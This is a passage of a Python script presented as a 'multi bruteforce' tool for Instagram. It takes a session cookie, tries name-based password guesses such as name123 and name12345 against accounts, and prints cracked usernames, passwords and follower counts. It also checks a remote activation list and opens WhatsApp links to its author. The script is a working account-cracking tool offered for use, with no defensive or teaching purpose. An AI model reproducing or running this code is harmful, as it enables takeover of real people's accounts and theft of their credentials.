...
{T}╔════════════════════════════════════╗
{T}║  {A} MULTI BRUTEFORCE INSTAGRA  {T}║
{T}║  {B} AUTHOR    {A}: {U}JEWELFUNDS{T}║
{T}║  {B} Github    {A}: {U}github.c {T}║
{T}║  {B} Facebook  {A}: {U}¢¢¢¢¢¢¢ {T}║
{T}╚════════════════════════════════════╝
""")
...
def chk(): 
  ...
  print ("\033[1;92m╰────────────────────────────────────────────╯")
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/JEWELFUND/PM/main/list.txt").text 
    if id in httpCaht: 
...
def ___login___():
    ...
    if ___cookie in ['open', 'Open', 'OPEN']:
        print(f"{T}╚═➣{M} You will be directed to the creator of this program !!!");sleep(3);os.system('xdg-open https://wa.me/+2349055012862?text=Bg+Cara+Ambil+Cookies+Ig+Kek+Mana?');___login___()
    elif ___cookie in ['', ' ']:
        ...
        try:
            ...
            os.system('xdg-open https://wa.me/+2349055012862?text=MAKASIH+BANG+SUDAH+AKTIFIN+ID+GUA')
...
class ___crack___:
    ...
    def __init__(self):
        ...
        print(f"{T}╔══════════════════════════════════════════════════════════╗")
        print(f"{T}                                                                              {T}")
        print(f"{T}║ [{Z}1{T}]{U} [✓] {B}Password {T}[{H}Name, Name123, Name12345{T}]             {T}")
        print(f"{T}║ [{Z}2{T}]{U} [✓] {B}Password {T}[{H}name, name123, name1234, name12345{T}]   {T}")
        print(f"{T}║ [{Z}3{T}]{U} [✓] {B}Password {T}[{M}name, name123, name1234, name12345, name123456{T}]{T}")
        print(f"{T}║ [{Z}4{T}]{U} [✓[ {B}Password {H}Manual {T}[{M}>5{T}]                         {T}")
        print(f"{T}                                                                              {T}")
        print(f"{T}╚══════════════════════════════════════════════════════════╝")
            ...
            for pw in pwx:
                ...
                with requests.Session() as ses:
                    ...
                    if 'userId' in str(response):
                        ...
                        print(f"\r{T}>> [{H}{T}]{A}  {T}:{H} ACTIVE✓")
                        print(f"{T}>> {Z}{T}]{A} Username {T}:{H} {uid}")
                        print(f"{T}>> {T}]{A} Password {T}:{H} {pw}")
                        print(f"{T}>> {T}]{A} Follower {T}:{H} {follower}")
                        print(f"{T}>> {T}]{A} Following {T}:{H} {following}\n")
                        ...
                        try:
                            ___roz = requests.get(f'https://i.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                        ...
                        print(f"\r{T}>> [{M}{T}]{A}{T}:{K} CP×")
                        print(f"{T}>> {T}]{A} Username {T}:{K} {uid}")
                        print(f"{T}>> {T}]{A} Password {T}:{K} {pw}")
                        print(f"{T}>> {T}]{A} Follower {T}:{K} {follower}")
                        print(f"{T}>> {T}]{A} Following {T}:{K} {following}\n")
